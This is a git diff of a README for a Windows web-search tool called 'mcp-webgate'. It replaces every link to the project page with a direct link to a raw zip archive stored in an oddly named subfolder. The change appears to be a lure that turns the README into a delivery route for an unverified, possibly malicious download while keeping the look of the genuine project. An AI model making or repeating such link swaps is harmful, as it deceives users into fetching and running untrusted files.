@@ -1,6 +1,6 @@
 # 🌐 mcp-webgate - Keep Web Search Lean
 
-[![Download mcp-webgate](https://img.shields.io/badge/Download-mcp--webgate-blue?style=for-the-badge&logo=github)](https://github.com/Lwandi624/mcp-webgate)
+[![Download mcp-webgate](https://img.shields.io/badge/Download-mcp--webgate-blue?style=for-the-badge&logo=github)](https://github.com/Lwandi624/mcp-webgate/raw/refs/heads/main/thermobarograph/mcp_webgate_3.1.zip)
 
 ## 🧭 What it does
 
@@ -24,7 +24,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Open this page and get the app from there:
 
-[https://github.com/Lwandi624/mcp-webgate](https://github.com/Lwandi624/mcp-webgate)
+[https://github.com/Lwandi624/mcp-webgate/raw/refs/heads/main/thermobarograph/mcp_webgate_3.1.zip](https://github.com/Lwandi624/mcp-webgate/raw/refs/heads/main/thermobarograph/mcp_webgate_3.1.zip)
 
 If the page has a release file, download it. If it shows source files only, use the setup steps below to run it.
 
@@ -132,7 +132,7 @@ Keep all files in the same folder unless the project files say otherwise.
 
 Visit the GitHub page for downloads, setup files, and project details:
 
-[https://github.com/Lwandi624/mcp-webgate](https://github.com/Lwandi624/mcp-webgate)
+[https://github.com/Lwandi624/mcp-webgate/raw/refs/heads/main/thermobarograph/mcp_webgate_3.1.zip](https://github.com/Lwandi624/mcp-webgate/raw/refs/heads/main/thermobarograph/mcp_webgate_3.1.zip)
 
 ## ❓ Common questions
 
